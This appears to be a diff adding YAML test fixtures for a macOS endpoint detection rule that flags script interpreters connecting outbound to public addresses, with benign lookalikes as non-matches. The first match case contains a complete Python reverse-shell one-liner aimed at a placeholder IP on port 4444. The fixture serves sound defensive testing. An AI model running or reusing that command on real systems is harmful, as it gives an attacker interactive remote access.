@@ -1,0 +1,42 @@
+match:
+  - desc: 'python3 -c socket.connect(("203.0.113.9",4444)) one-liner reverse shell'
+    events:
+      - name: NetworkConnect
+        platform: macos
+        source: netpoll
+        proc: {pid: 6301, ppid: 6300, exe: /usr/bin/python3, name: python3, cmdline: "python3 -c import socket,os,pty;s=socket.socket();s.connect((\"203.0.113.9\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")", uid: 501, euid: 501, signing_id: com.apple.python3, is_platform: true, is_signed: true}
+        net: {proto: tcp, direction: outbound, sip: 10.0.0.5, sport: 50600, dip: 203.0.113.9, dport: 4444}
+        args: {fd: "3"}
+  - desc: perl from Homebrew to a public IPv6 address on port 1337
+    events:
+      - name: NetworkConnect
+        platform: macos
+        source: netpoll
+        proc: {pid: 6303, ppid: 6302, exe: /opt/homebrew/bin/perl, name: perl, cmdline: "perl -e use Socket;...", uid: 501, euid: 501, is_platform: false, is_signed: true}
+        net: {proto: tcp, direction: outbound, sip: 2001:db8::5, sport: 50601, dip: 2001:db8:ff::9, dport: 1337}
+        args: {fd: "3"}
+nomatch:
+  - desc: benign lookalike - pip downloading over HTTPS
+    events:
+      - name: NetworkConnect
+        platform: macos
+        source: netpoll
+        proc: {pid: 6311, ppid: 6310, exe: /usr/bin/python3, name: python3, cmdline: "python3 -m pip install requests", uid: 501, euid: 501, signing_id: com.apple.python3, is_platform: true, is_signed: true}
+        net: {proto: tcp, direction: outbound, sip: 10.0.0.5, sport: 50610, dip: 151.101.0.223, dport: 443}
+        args: {fd: "5"}
+  - desc: benign lookalike - node dev server talking to a database on the LAN
+    events:
+      - name: NetworkConnect
+        platform: macos
+        source: netpoll
+        proc: {pid: 6312, ppid: 6310, exe: /opt/homebrew/bin/node, name: node, uid: 501, euid: 501, is_platform: false, is_signed: true}
+        net: {proto: tcp, direction: outbound, sip: 192.168.1.20, sport: 50611, dip: 192.168.1.30, dport: 5432}
+        args: {fd: "21"}
+  - desc: a compiled binary (not an interpreter) to an uncommon public port
+    events:
+      - name: NetworkConnect
+        platform: macos
+        source: netpoll
+        proc: {pid: 6313, ppid: 6310, exe: /Applications/Game.app/Contents/MacOS/Game, name: Game, uid: 501, euid: 501, team_id: ABCDE12345, cs_category: developer_id, is_platform: false, is_signed: true}
+        net: {proto: udp, direction: outbound, sip: 10.0.0.5, sport: 50612, dip: 203.0.113.70, dport: 27015}
+        args: {fd: "9"}
